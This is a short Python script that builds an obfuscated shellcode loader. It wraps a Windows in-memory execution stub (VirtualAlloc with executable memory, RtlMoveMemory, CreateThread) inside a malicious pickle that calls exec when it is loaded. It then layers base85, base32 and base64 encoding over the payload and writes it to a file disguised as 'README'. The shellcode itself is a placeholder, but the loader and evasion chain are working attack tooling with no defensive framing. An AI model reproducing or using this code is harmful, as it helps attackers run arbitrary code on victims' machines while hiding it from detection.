from base64 import b64encode, b32encode, b85encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad as padding
from pickle import dumps, dump

buf = b"这里放shellcode"

buf = b64encode(buf)

shellcode = f"""
buf = b64decode({buf})
shellcode = bytearray(buf)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40)
)

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))
ctypes.windll.kernel32.WaitForSingleObject(
    ctypes.c_int(ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_uint64(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0)))
    ),ctypes.c_int(-1)
)
"""


class exp(object):
    def __reduce__(self):
        return (exec, (shellcode,))


def se():
    res = dumps(exp())
    return res


k = res = se()
res = b85encode(res)
res = b32encode(res)
res = b64encode(res)

f = open("README", "wb")
dump(res, f)
